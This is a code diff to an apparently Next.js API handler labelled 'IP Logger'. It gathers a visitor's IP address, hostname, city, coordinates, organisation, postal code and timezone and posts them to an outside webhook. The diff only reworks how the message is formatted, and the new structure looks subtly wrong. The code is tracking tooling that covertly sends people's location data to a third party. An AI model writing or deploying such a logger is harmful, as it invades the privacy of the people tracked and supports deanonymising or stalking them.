@@ -36,8 +36,10 @@ export default async function handler(
   const postal: string = req.body.postal
   const timezone: string = req.body.timezone
 
-  var embed = new MessageEmbed()
-    .setDescription(`**IP Logger: ** 
+  var params = 
+  {
+    embeds: [
+    `**IP Logger: ** 
     \n**IP: ** ${ip}
     \n**Hostname: ** ${hostname}
     \n**City: ** ${city}
@@ -46,14 +48,17 @@ export default async function handler(
     \n**Loc: ** ${loc}
     \n**Org: ** ${org}
     \n**Postal: ** ${postal}
-    \n**Timezone: ** ${timezone}`)
+    \n**Timezone: ** ${timezone}`
+    ]
+  
+  };
 
   await fetch(webhook, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify({ content: embed })
+    body: JSON.stringify({ content: params })
   })
     .catch(error => console.error('IP:', ip +  `Country:`, country + `Region:`, region + `City:`, city))
   return res.status(204).end()
